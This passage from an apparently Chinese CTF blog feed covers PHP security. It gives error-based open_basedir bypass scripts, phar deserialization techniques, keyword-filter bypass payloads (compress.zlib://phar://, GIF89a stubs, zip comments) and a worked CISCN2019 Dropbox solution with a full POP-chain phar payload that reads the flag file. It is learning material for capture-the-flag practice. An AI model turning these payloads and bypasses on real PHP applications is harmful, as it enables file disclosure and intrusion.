8)</p></blockquote><ol><li>getRealPath()用于获取文件的绝对路径。bypass原理同样是<strong>基于报错</strong>，该方法在获取文件路径的时候，如果存入一个不存在的路径时，会返回false，否则返回绝对路径，而且他还<strong>直接忽略了open_basedir的设定</strong> –&gt; 这个方法有个特点：完全没有考虑open_basedir。在传入的路径为一个不存在的路径时，会返回false；在传入的路径为一个存在的路径时，会正常返回绝对路径 from p牛</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SplFileInfo</span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">new</span> <span class="built_in">SplFileInfo</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;dir&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$info</span>-&gt;<span class="title function_ invoke__">getRealPath</span>());</span><br></pre></td></tr></table></figure><h3 id="3-函数-realpath-string-path-string-false"><a href="#3-函数-realpath-string-path-string-false" class="headerlink" title="3. 函数: realpath(string $path): string|false"></a>3. 函数: realpath(string $path): string|false</h3><blockquote><p>Windows下才可以</p></blockquote><ol><li>realpath()返回规范化的绝对路径名,它可以去掉多余的..&#x2F;或.&#x2F;等跳转字符，能将相对路径转换成绝对路径</li><li><strong>盲注</strong>: 在开启了open_basedir的情况下，如果我们传入一个不存在的文件名，会返回false，但是如果我们传入一个不在open_basedir里的文件的话，他就会返回file is not within the allowed path(s)</li></ol><h3 id="4-拓展库函数-GD库imageftbbox-imagefttext"><a href="#4-拓展库函数-GD库imageftbbox-imagefttext" class="headerlink" title="4. 拓展库函数: GD库imageftbbox&#x2F;imagefttext"></a>4. 拓展库函数: GD库imageftbbox&#x2F;imagefttext</h3><blockquote><p>有加载对于库<br>这个方法报错的时候并不会把真正的路径爆出来，这也是其与realpath的最大不同之处。所以，我们只能一位一位地猜测，即使再windows下使用通配符&lt;&gt;都不可以</p></blockquote><ol><li>GD库一般是PHP必备的扩展库之一</li><li>拿imageftbbox举个例子，这个函数第三个参数是字体的路径。发现当这个参数在open_basedir外的时候，当文件存在，则php会抛出“File(xxxxx) is not within the allowed path(s)”错误。但当文件不存在的时候会抛出“Invalid font filename”错误 –&gt; <strong>盲注</strong></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(<span class="string">&#x27;isexists&#x27;</span>);</span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;d:/test/&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>); <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$dir</span> . <span class="variable">$chars</span>[<span class="variable">$i</span>] . <span class="string">&#x27;&lt;&gt;&lt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//$m = imagecreatefrompng(&quot;zip.png&quot;);</span></span><br><span class="line">    <span class="comment">//imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, &#x27;aaa&#x27;);</span></span><br><span class="line">    <span class="title function_ invoke__">imageftbbox</span>(<span class="number">100</span>, <span class="number">100</span>, <span class="variable">$file</span>, <span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isexists</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$errstr</span>, <span class="string">&#x27;Invalid font filename&#x27;</span>) === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s&lt;br/&gt;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化利用</title>
      <link href="/2024/11/07/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/"/>
      <url>/2024/11/07/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="UNDONE"><a href="#UNDONE" class="headerlink" title="UNDONE"></a>UNDONE</h2><ol><li>phar反序列化中关键标识绕过可以任意zip等吗？</li><li>phar出发函数支持通配符吗？</li><li>phar是可以没有</li><li>[<a href="https://blog.csdn.net/MrWangisgoodboy/article/details/130146658]%E4%B8%ADphar%E7%AD%BE%E5%90%8D%E9%97%AE%E9%A2%98">https://blog.csdn.net/MrWangisgoodboy/article/details/130146658]中phar签名问题</a></li><li>session上传中无需进行闭合吗？其实要闭合也不难的，也是origin和target这样，往target凑即可</li></ol><h2 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h2><h3 id="常用魔术方法"><a href="#常用魔术方法" class="headerlink" title="常用魔术方法"></a>常用魔术方法</h3><h2 id="原生类利用"><a href="#原生类利用" class="headerlink" title="原生类利用"></a>原生类利用</h2><h3 id="php可利用原生类"><a href="#php可利用原生类" class="headerlink" title="php可利用原生类"></a>php可利用原生类</h3><blockquote><p>SPL php标准库[<a href="https://www.php.net/manual/zh/book.spl.php]">https://www.php.net/manual/zh/book.spl.php]</a></p></blockquote><ol><li><p>常见的原生类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="built_in">Error</span></span><br><span class="line"><span class="built_in">Exception</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 网络</span></span><br><span class="line">SoapClient</span><br><span class="line">SimpleXMLElement</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件系统</span></span><br><span class="line"><span class="built_in">DirectoryIterator</span></span><br><span class="line"><span class="built_in">FilesystemIterator</span></span><br><span class="line"><span class="built_in">SplFileObject</span></span><br></pre></td></tr></table></figure></li><li><p><em><strong>脚本筛选</strong></em></p><ol><li>可以用来获取存在给定方法的原生类</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">            // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类</span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h3><blockquote><p>有三个类: DirectoryIterator, FilesystemIterator, GlobIterator</p></blockquote><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><blockquote><p>SplFileObject: [<a href="https://www.php.net/manual/zh/class.splfileobject.php]">https://www.php.net/manual/zh/class.splfileobject.php]</a></p></blockquote><h2 id="Phar利用"><a href="#Phar利用" class="headerlink" title="Phar利用"></a>Phar利用</h2><blockquote><p>目的与特性：在没有<code>unserialize()</code>函数的情况下通过文件系统调用</p></blockquote><h3 id="Phar-Ref"><a href="#Phar-Ref" class="headerlink" title="Phar Ref"></a>Phar Ref</h3><ol><li><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf">blackhat祖师爷</a></li><li><a href="https://paper.seebug.org/680/">知道创宇简要介绍</a></li><li><a href="https://www.freebuf.com/articles/web/291992.html">绕过技巧</a></li><li><a href="https://www.anquanke.com/post/id/240007#h2-5"><em><strong>为什么非phar文件也可以进行反序列化?</strong></em></a><ol><li><a href="https://guokeya.github.io/post/uxwHLckwx/">生成脚本，但是不详细</a></li></ol></li></ol><h3 id="what-why"><a href="#what-why" class="headerlink" title="what&amp;&amp;why"></a>what&amp;&amp;why</h3><ol><li>PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发</li><li><em><strong>文件格式</strong></em><ol><li>stub是一个文件标志，格式为: <code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，这里的xxx可以是任何内容，但是一定要有后面的<code>&lt;?...?&gt;</code>部分</li><li>manifest是被压缩的文件的属性等放在这里，这部分是以序列化存储的，是主要的攻击点</li><li>contents是被压缩的内容</li><li>signature签名，放在文件末尾</li></ol></li><li><em><strong>漏洞利用</strong></em><ol><li><em><strong>利用原理</strong></em>: 有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar:&#x2F;&#x2F;伪协议解析phar文件时，都会将meta-data进行<strong>反序列化并完成对象的生命周期并销毁</strong> –&gt; 受影响函数如下<img src="/pic/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/phar_affectedfunc.png" alt="受影响函数"></li><li>它有一个特性就是phar文件会以序列化的形式储存用户自定义的meta-data -&gt; <strong>配合phar:&#x2F;&#x2F;伪协议进行漏洞攻击</strong></li><li><em><strong>利用条件</strong></em><ol><li>Phar需要 PHP &gt;&#x3D; 5.2</li><li>phar可以上传到服务器端(存在文件上传)</li><li>如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数后类中要有可用的方法&#x2F;魔术方法作为”跳板”。</li><li>文件操作函数的参数可控，且:、&#x2F;、phar等特殊字符没有被过滤</li></ol></li></ol></li></ol><h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><ol><li>S1: 生成phar文件<ol><li>需要在生成phar文件需要修改php.ini中的配置，将phar.readonly设置为Off</li><li><code>__HALT_COMPILER();</code>必须大写，小写不会被识别出来。导致无法进行反序列化操作。</li><li>上传时将test.phar修改文件扩展名为jpg也可以进行反序列化，不会影响解析，<strong>但是生成时需要使用phar后缀</strong>，魔术头可以随便加</li></ol></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">targetClass</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 这里的targetClass一般是攻击文件中含有的类，存在数据的利用点</span></span><br><span class="line">    <span class="variable">$someProperty</span> = <span class="string">&quot;phpinfo();&quot;</span>;   <span class="comment">// 传到目标类的sink里</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;whateveryouwant&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">targetClass</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$obj</span>); <span class="comment">//将自定义的meta-data存入manifest，这一步注入攻击</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;flag&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Phar绕过技巧"><a href="#Phar绕过技巧" class="headerlink" title="Phar绕过技巧"></a>Phar绕过技巧</h3><ol><li><p>文件尾phar关键字绕过</p><ol><li>Solution: 由于php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件</li><li>还可以加上魔术头在<code>$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</code></li></ol></li><li><p>伪协议phar过滤绕过</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 注意到这里只是开头</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i&quot;</span>,$filename)&#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. Solution</span></span><br><span class="line">    <span class="comment"># Bzip / Gzip</span></span><br><span class="line">    <span class="comment"># 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过</span></span><br><span class="line">    compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">    compress.bzip2://phar:///home/sx/test.phar/test.txt</span><br><span class="line">    compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line"></span><br><span class="line">    php://<span class="built_in">filter</span>/resource=phar:///test.phar/test.txt</span><br><span class="line">    <span class="comment"># 还可以使用伪协议的方法绕过</span></span><br><span class="line">    php://<span class="built_in">filter</span>/read=convert.base64-encode/resource=phar://phar.phar</span><br></pre></td></tr></table></figure></li><li><p>绕过<code>__HALT_COMPILER</code>特征检测</p><ol><li><p>因为phar中的a stub字段必须以<code>__HALT_COMPILER();</code>字符串来结尾，否则phar扩展将无法识别这个文件为phar文件，所以这段字符串不能省略，只能绕过</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&lt;/?|php|HALT_COMPILER/i&quot;</span>,<span class="variable">$filename</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><em><strong>Solution1: Gzip</strong></em></p><ol><li>首先将 phar 文件使用 gzip 命令进行压缩，可以看到压缩之后的文件中就没有了__HALT_COMPILER()，将 phar.gz 后缀改为 png（png文件可以上传），<em><strong>target:</strong></em> <code>?filename=phar://pic/phar.phar.gz/phar.phar</code> –&gt; 直接通过phar协议即可</li></ol></li><li><p><em><strong>Solution2: zip</strong></em></p><ol><li>将phar的内容写进压缩包注释中，也同样能够反序列化成功，压缩为zip也会绕过该正则</li></ol>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar_file</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>);   <span class="comment">// 你的攻击点对象，$exp是可以利用的类</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$phar_file</span>;</span><br><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;1.zip&#x27;</span>,<span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>); </span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;crispr.txt&#x27;</span>, <span class="string">&#x27;file content goes here&#x27;</span>);    <span class="comment">// 不重要</span></span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">setArchiveComment</span>(<span class="variable">$phar_file</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传入?file=phar://phar.zip//phar.phar</span></span><br></pre></td></tr></table></figure></li><li><p><em><strong>Solutions</strong></em></p><ol><li>前文说到，将phar包压缩成gzip仍然能够触发反序列化，并且将phar写入到zip注释中也同样能达到如上的效果,其实并不只有这些，将Phar压缩成tar、gzip、bzip2后均能够触发反序列化</li><li>具体原因见ref中的链接，你看得到的</li></ol></li></ol></li></ol><h3 id="Phar例题"><a href="#Phar例题" class="headerlink" title="Phar例题"></a>Phar例题</h3><h4 id="Phar例1-CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#Phar例1-CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="*Phar例1:[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>*Phar例1:[CISCN2019 华北赛区 Day1 Web1]Dropbox</h4><h5 id="Dropbox-Ref"><a href="#Dropbox-Ref" class="headerlink" title="Dropbox Ref"></a>Dropbox Ref</h5><ol><li><a href="https://blog.csdn.net/xxy605/article/details/120172274">很不错的题解</a></li></ol><h5 id="Phar例1思考与尝试-Failed"><a href="#Phar例1思考与尝试-Failed" class="headerlink" title="Phar例1思考与尝试(Failed)"></a>Phar例1思考与尝试(Failed)</h5><ol><li>扫目录没有，目录遍历试试：filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd，可读</li><li>读源码审计阶段<ol><li>Class.php<ol><li>User类大部分依赖mysqli，预处理，不考虑sql注入，这里是以<strong>root权限</strong>进行连接的</li><li>这一道题注重于文件操作？与文件操作有关？<ol><li>File通过open设置指向的filename，并通过其他函数获取信息，close()时读取文件内容</li><li>FileList中files数组中存放着当前目录下的文件<ol><li>当尝试调用一个未定义或不可访问的方法时，<code>__call()</code>会被自动调用</li></ol></li></ol></li></ol></li><li>Upload.php<ol><li>会将文件进行移动</li><li>filename长度进行了限制</li></ol></li><li>login.php和register.php一起的<ol><li>直接知道沙箱的路径</li></ol></li><li>download.php<ol><li>对&#x2F;flag进行了过滤</li></ol></li></ol></li><li>这里应该是要进行rce，找找可控输入，download.php中的filename连接到了class.php中file的get_file_contents()，敏锐phar反序列化，<ol><li>get_file_contents中使用，下面略<ol><li>没有问题的，download中有include class.php，可以实现直接调用并在<code>__destruct()</code>函数输出result的结果，现在的重点在于调用想要的函数</li></ol></li><li>应为flag给我们过滤了，额日期额设置了open_basedir，需要是在新进程中<ol><li>一个新的File对象，filename是flag，然后通过调用close进行读取flag内容</li><li>上传的名称是自定义的，上传一个&#x2F;flag的文件？，通过FileList的<code>__construct</code>创建对象？不行，需要wakeup，只能同故宫<code>__destruct</code>了</li></ol></li></ol></li><li>没想出来，感觉有遗漏的点，看看题解先，看完题解，还得练，已经在进步了 –&gt; 要不是太困可能还真想得出来，但是这里跑偏了</li></ol><h5 id="Phar例1fix"><a href="#Phar例1fix" class="headerlink" title="*Phar例1fix"></a>*Phar例1fix</h5><blockquote><p>上面思路方向是对，但是偏的有点严重了，重新来一下</p></blockquote><ol><li><p><em><strong>这里应该从宏观出发</strong></em></p></li><li><p>最终是要获取&#x2F;flag.php或者&#x2F;flag.txt这样，这里没有自定义函数，应该是到不了rce的地步，直接读文件的话</p></li><li><p>寻找<em><strong>可控输入点</strong></em></p><ol><li>download.php中的filename</li><li>delete.php中的filename</li></ol></li><li><p>这里因为download中有ini_set的open_basedir，所以似乎读不了，会被限制住，在include的class.php中也有，根本无法读</p></li><li><p>先从文件出发吧，有download.php的get_file_contents不行的话，就只有File的close方法了，这里要求有一个File对象的filename是&#x2F;flag.txt这样还需要调用close方法？</p><ol><li>phar get_file_contents中反序列化自定义，有open_basedir不行</li><li>phar unlink中也可以反序列化自定义 –&gt; <em><strong>phar出发函数不知一个</strong></em></li></ol></li><li><p>观察到另一个close的话是User里的了，通过设置User的对应属性是一个File对象可以吗，可以的，调用close方法，只有返回没有输出，还有FileList类啊，有<code>__destruct</code>可以输出通过FileList调用的File函数的返回内容 –&gt; User -&gt; FileList: <code>close</code> -&gt; File: <code>close</code> -&gt; FileList: <code>__destruct</code></p></li><li><p>最终payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="keyword">new</span> <span class="title class_">File</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">FileList</span>(); <span class="comment">// 这个就是phar要包含的对象了</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&#x27;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$user</span>); <span class="comment">//将自定义的meta-data存入manifest，这一步注入攻击</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;nothing.txt&quot;</span>, <span class="string">&quot;nothing&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 随后进行改名为phar.gif</span></span><br><span class="line"><span class="comment">// 点击删除</span></span><br><span class="line"><span class="comment">// 截取filename=phar://phar.gif</span></span><br><span class="line"><span class="comment">// 成功获取flag</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h5 id="Phar例1总结"><a href="#Phar例1总结" class="headerlink" title="*Phar例1总结"></a>*Phar例1总结</h5><ol><li><em><strong>思路上</strong></em><ol><li>这里从读&#x2F;flag为<strong>目标导向</strong>逆向推理比较容易出思路</li><li>遇到不行的就不要硬啃绕，<strong>改改方向</strong>，不要被openbasedir绕晕了，可能可行说明思路正确，可以找找有没有其他切入口</li><li>确定反序列化后先找<strong>利用链</strong>，这里就是你的目标</li></ol></li></ol><h4 id="Phar例2-CTFshow-web-phar-条件竞争"><a href="#Phar例2-CTFshow-web-phar-条件竞争" class="headerlink" title="Phar例2:[CTFshow web]phar+条件竞争"></a>Phar例2:[CTFshow web]phar+条件竞争</h4><h2 id="SESSION利用"><a href="#SESSION利用" 